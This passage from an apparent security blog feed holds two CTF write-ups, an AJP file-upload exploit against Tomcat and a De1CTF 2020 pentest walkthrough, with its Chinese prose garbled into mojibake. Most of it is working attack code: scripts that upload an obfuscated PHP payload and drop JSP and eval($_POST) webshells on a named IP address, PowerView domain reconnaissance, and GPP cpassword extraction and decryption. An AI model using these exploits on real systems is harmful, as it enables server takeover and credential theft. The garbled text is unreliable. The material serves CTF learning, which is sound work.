æ–‡ä»¶</h3><p>å› ä¸ºç½‘ä¸Šajpåè®®è®¨è®ºè¾ƒå°‘ï¼Œå’Œexpæœ‰å…³çš„åªæœ‰CVE-2020-1938ï¼Œä¸è¿‡payloadçš„æ„é€ æ¯”è¾ƒå•ä¸€å¹¶ä¸æ¶‰åŠåˆ°ä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚ï¼Œç½‘ä¸Šåº”è¯¥ä¹Ÿæ²¡æœ‰ä»‹ç»ç›¸å…³çš„æ–‡ç« ã€‚é‚£è¦æ€ä¹ˆé€šè¿‡ajpä¼ ï¼Ÿæˆ‘é¢„æƒ³çš„æ€è·¯æ˜¯é€‰æ‰‹é€šè¿‡é˜…è¯»ç›¸å…³ç±»åº“æ¥è§£å†³æ¯”å¦‚<a href="https://github.com/hypn0s/AJPy">AJPy</a>ï¼Œåœ¨tomcat.pyä¸­æä¾›äº†ä¸€ç§éƒ¨ç½²waråŒ…getshellçš„æ“ä½œï¼Œè¿™é‡Œé¢å°±æœ‰ä¸Šä¼ æ–‡ä»¶çš„æ“ä½œï¼Œå¯ä»¥å€Ÿé‰´ã€‚<br><img src="1594002267067-acd0c056-d4bf-46f6-8187-192f0244dc41.png#align=left&display=inline&height=618&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1236&originWidth=2380&size=320042&status=done&style=none&width=1190" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> ajpy.ajp <span class="keyword">import</span> AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException</span><br><span class="line"><span class="keyword">from</span> tomcat <span class="keyword">import</span> Tomcat</span><br><span class="line"></span><br><span class="line">target_host = <span class="string">"127.0.0.1"</span></span><br><span class="line">gc = Tomcat(target_host, <span class="number">8009</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">"shell.jpg"</span></span><br><span class="line">payload = <span class="string">"&lt;% out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\"cat /flag.txt\").getInputStream())).readLine()); %&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/tmp/request"</span>, <span class="string">"w+b"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s_form_header = <span class="string">'------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n'</span> % filename</span><br><span class="line">    s_form_footer = <span class="string">'\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'</span></span><br><span class="line">    f.write(s_form_header.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    f.write(payload.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    f.write(s_form_footer.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">data_len = os.path.getsize(<span class="string">"/tmp/request"</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">"SC_REQ_CONTENT_TYPE"</span>: <span class="string">"multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti"</span>,</span><br><span class="line">        <span class="string">"SC_REQ_CONTENT_LENGTH"</span>: <span class="string">"%d"</span> % data_len,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"req_attribute"</span></span><br><span class="line">        , <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"/;/admin/upload"</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">    , &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"req_attribute"</span></span><br><span class="line">        , <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.path_info"</span>, <span class="string">"/"</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">    , &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"req_attribute"</span></span><br><span class="line">        , <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">""</span>, )</span><br><span class="line">    &#125;</span><br><span class="line">, ]</span><br><span class="line"></span><br><span class="line">hdrs, data = gc.perform_request(<span class="string">"/"</span>, headers=headers, method=<span class="string">"POST"</span>,  attributes=attributes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/tmp/request"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)</span><br><span class="line">    responses = br.send_and_receive(gc.socket, gc.stream)</span><br><span class="line"></span><br><span class="line">r = AjpResponse()</span><br><span class="line">r.parse(gc.stream)</span><br><span class="line"></span><br><span class="line">shell_path = r.data.decode(<span class="string">'utf-8'</span>).strip(<span class="string">'\x00'</span>).split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">print(<span class="string">"="</span>*<span class="number">50</span>)</span><br><span class="line">print(shell_path)</span><br><span class="line">print(<span class="string">"="</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">gc = Tomcat(<span class="string">'127.0.0.1'</span>, <span class="number">8009</span>)</span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.path_info"</span>, shell_path,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">]</span><br><span class="line">hdrs, data = gc.perform_request(<span class="string">"/uploads/1.jsp"</span>, attributes=attributes)</span><br><span class="line">output = sys.stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output.write(d.data.decode(<span class="string">'utf8'</span>))</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        output.write(repr(d.data))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      å‘è¿™ç¯‡æ–‡ç« çš„æ—¶å€™å·²ç»æ¯•ä¸šå¿«ä¸€æœˆäº†ï¼Œæ„Ÿè°¢Sycloverè€å­¦é•¿ä»¬å’Œå°ä¼™ä¼´çš„ä¸€è·¯å¸®åŠ©ï¼Œæ„Ÿè°¢ç›¸é‡ã€‚
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>De1tactf2020 pentestéé¢„æœŸè§£ä¸é¢„æœŸè§£</title>
    <link href="https://cl0und.github.io/2020/05/05/De1tactf2020-pentest%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E9%A2%84%E6%9C%9F%E8%A7%A3/"/>
    <id>https://cl0und.github.io/2020/05/05/De1tactf2020-pentest%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E9%A2%84%E6%9C%9F%E8%A7%A3/</id>
    <published>2020-05-05T09:13:40.000Z</published>
    <updated>2020-07-11T08:02:56.309Z</updated>
    
    <content type="html"><![CDATA[<!-- æŠŠä¸€äº›åœç•™åœ¨ç†è®ºè®¤çŸ¥ä¸Šçš„é«˜çº§æ”»å‡»å§¿åŠ¿å…¨éƒ¨æ“ç»ƒäº†ä¸€éï¼Œå­¦åˆ°å¾ˆå¤šã€‚ --><!-- more --><h2 id="pentest1"><a href="#pentest1" class="headerlink" title="pentest1"></a>pentest1</h2><p>å…ˆæ˜¯ä¸€ä¸ªæœ‰ç»•è¿‡çš„æ–‡ä»¶ä¸Šä¼ ï¼Œè¿™éƒ¨åˆ†æ˜¯å…¶ä»–å°ä¼™ä¼´åšçš„ç›´æ¥ç»™expäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://47.113.219.76/index.php'</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'multipart/form-data; boundary=----WebKitFormBoundaryhJUhA4FiLizuakBx'</span></span><br><span class="line">&#125;</span><br><span class="line">data=<span class="string">"""------WebKitFormBoundaryhJUhA4FiLizuakBx</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="&#123;&#125;"</span></span><br><span class="line"><span class="string">Content-Type: image/jpeg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryhJUhA4FiLizuakBx</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryhJUhA4FiLizuakBx--"""</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"""</span></span><br><span class="line"><span class="string">&lt;?=$_=[]?&gt;&lt;?=$_=@"$_"?&gt;&lt;?=$_=$_['!'=='@']?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$__=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$___=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$____=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_____=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$______=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_______=$_?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$________=$_?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$__?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$___?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$______?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$________='_'?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$_________=$__.$___.$__.$____.$_____.$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$__________=$________.$_______.$_____.$____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$____________________=$$__________?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$____________________[_]($____________________[__],$____________________[___])?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">data=data.format(<span class="string">"syc.pHp"</span>,payload)</span><br><span class="line"></span><br><span class="line">r=requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line">filename=re.search(<span class="string">"in:(uploads/.*)"</span>,r.text).group(<span class="number">1</span>)</span><br><span class="line">filename=filename.strip()</span><br><span class="line"></span><br><span class="line">print(<span class="string">"http://47.113.219.76/"</span>+filename)</span><br><span class="line">r=requests.get(<span class="string">"http://47.113.219.76/"</span>+filename+<span class="string">"?_=file_put_contents&amp;__=1.php&amp;___=&lt;?php eval($_POST[a]);?&gt;"</span>)</span><br><span class="line"></span><br><span class="line">print(r.status_code)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>æ‰“å®Œè®¿é—®å¯¹åº”ç›®å½•æ˜¯ä¸‹çš„1.phpï¼Œå¯†ç æ˜¯aã€‚</p><p>è¿ä¸ŠwebshellåæŠŠshellåå¼¹åˆ°csä¸Šï¼Œä½¿ç”¨powerviewè¿›è¡Œä¿¡æ¯æ”¶é›†å¯ä»¥çœ‹åˆ°ï¼ŒåŸŸå†…å…±äº«æœ‰ä¸€ä¸ªhintã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> /Users/cengsiqi/Desktop/pentest/wintool/PowerView<span class="literal">-dev</span>.ps1</span><br><span class="line">powershell <span class="built_in">get-domaincomputer</span>|<span class="built_in">get-netshare</span></span><br></pre></td></tr></table></figure><p><img src="1588571307111-5e34ec2e-3746-4588-a39a-10f3a9f63a25.png#align=left&display=inline&height=370&margin=%5Bobject%20Object%5D&name=image.png&originHeight=740&originWidth=1972&size=170863&status=done&style=none&width=986" alt="image.png"><br>æŸ¥çœ‹è¿™ä¸ªHintå¯ä»¥å‘ç°ï¼Œæœ‰ä¸€ä¸ªæ‹¿flagçš„tipã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\dc.De1CTF2020.lab\Hin</span><br></pre></td></tr></table></figure><p><img src="1588571461665-c690928a-3e23-45b0-a976-6085f19c8b8c.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=516&originWidth=1310&size=89949&status=done&style=none&width=746" alt="image.png"><br>æŠŠæç¤ºæ‹·è´ä¸‹æ¥ä¸‹è½½å‘ç°è¿™ä¸ªzipéœ€è¦å¯†ç æ‰èƒ½æ‰“å¼€ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy \\dc.De1CTF2020.lab\Hint\flag1_and_flag2hint.zip .</span><br></pre></td></tr></table></figure><p><img src="1588571579651-4a3a8b66-d1f2-45fd-a1f5-0f3ece8c3806.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=1394&size=41584&status=done&style=none&width=746" alt="image.png"><br><img src="1588571632020-37b1afd9-feb0-418c-ad5d-1c4498fd8e69.png#align=left&display=inline&height=232&margin=%5Bobject%20Object%5D&name=image.png&originHeight=228&originWidth=734&size=162224&status=done&style=none&width=746" alt="image.png"></p><p>æ¥ç€æ”¶é›†ï¼ŒåŸŸå†…ç”¨æˆ·ä¿¡æ¯å‘ç°æœ‰ä¸€ä¸ªå¯ç–‘ç”¨æˆ·ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user /dom</span><br></pre></td></tr></table></figure><p><img src="1588571706287-81a8ed6d-3616-4d15-8bf5-71f73ddd2ab0.png#align=left&display=inline&height=278&margin=%5Bobject%20Object%5D&name=image.png&originHeight=512&originWidth=1372&size=69925&status=done&style=none&width=746" alt="image.png"><br>çŒœæµ‹HintZip_Passè´¦æˆ·å¯†ç å°±æ˜¯è§£å‹ç¼©çš„å¯†ç ã€‚è¿™é‡Œç»è¿‡ä¸€äº›å°è¯•ä¹‹åè€ƒè™‘ä¼šä¸ä¼šæ˜¯gppå°è¯•psç›´æ¥å¯¼å‡ºï¼Œå‘ç°çˆ†äº†ä¸ªé”™ï¼Œçœ‹æ„æ€æ˜¯è¯´å½“å‰ç”¨æˆ·ä¸æ˜¯domain userï¼ˆå®¢è§‚äº‹å®æ˜¯å½“å‰è´¦æˆ·å°±æ˜¯åŸŸç”¨æˆ·ï¼‰ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> /Users/cengsiqi/Desktop/pentest/<span class="built_in">Get-GPPPassword</span>.ps1</span><br><span class="line">powershell <span class="built_in">Get-GPPPassword</span></span><br></pre></td></tr></table></figure><p><img src="1588572573067-016fb792-b6b8-4668-bcf1-867cd7c903d6.png#align=left&display=inline&height=264&margin=%5Bobject%20Object%5D&name=image.png&originHeight=528&originWidth=3320&size=219484&status=done&style=none&width=1660" alt="image.png"><br>ä¹Ÿä¸ä¼šæ”¹powershellï¼Œå°±ç›´æ¥æ‰‹åŠ¨éå†SYSVOLäº†ï¼ˆè¿˜å¥½ä¸æ˜¯å¾ˆå¤šï¼Œå¤šçš„è¯å»ºè®®å¼¹åˆ°msfä¸Šç”¨msfçš„è„šæœ¬æï¼‰<br><img src="1588572660278-a2470a51-0660-40e9-84db-f27631fd0de1.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=330&originWidth=3098&size=139547&status=done&style=none&width=1549" alt="image.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;Groups clsid=<span class="string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span>&gt;&lt;User clsid=<span class="string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> name=<span class="string">"HintZip_Pass"</span> image=<span class="string">"2"</span> changed=<span class="string">"2020-04-15 14:43:23"</span> uid=<span class="string">"&#123;D33537C1-0BDB-44B7-8628-A6030A298430&#125;"</span>&gt;&lt;Properties action=<span class="string">"U"</span> newName=<span class="string">""</span> fullName=<span class="string">""</span> description=<span class="string">""</span> cpassword=<span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span> changeLogon=<span class="string">"1"</span> noChange=<span class="string">"0"</span> neverExpires=<span class="string">"0"</span> acctDisabled=<span class="string">"0"</span> userName=<span class="string">"HintZip_Pass"</span>/&gt;&lt;/User&gt;</span><br><span class="line">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpp<span class="literal">-decrypt</span> uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+<span class="number">08</span></span><br></pre></td></tr></table></figure><p><img src="1588572802371-89b2b0bb-448d-4a90-bf15-98e33fc1aeb7.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=image.png&originHeight=114&originWidth=1560&size=30614&status=done&style=none&width=780" alt="image.png"><br>ç”¨zL1PpP@sSwO3dè§£å¯†åˆšæ‰çš„å‹ç¼©åŒ…flag1_and_flag2hint.zipå³å¯å¾—åˆ°ï¼Œç¬¬ä¸€ä¸ªflagå’Œä¸‹ä¸€å…³çš„æç¤ºã€‚<br><img src="1588573070964-1b84f5a1-acb3-4953-9c2d-73178a7d1f04.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&name=image.png&originHeight=424&originWidth=1910&size=215139&status=done&style=none&width=955" alt="image.png"></p><h2 id="pentest2"><a href="#pentest2" class="headerlink" title="pentest2"></a>pentest2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag1: De1CTF&#123;GpP_11Is_SoOOO_Ea3333y&#125;</span><br><span 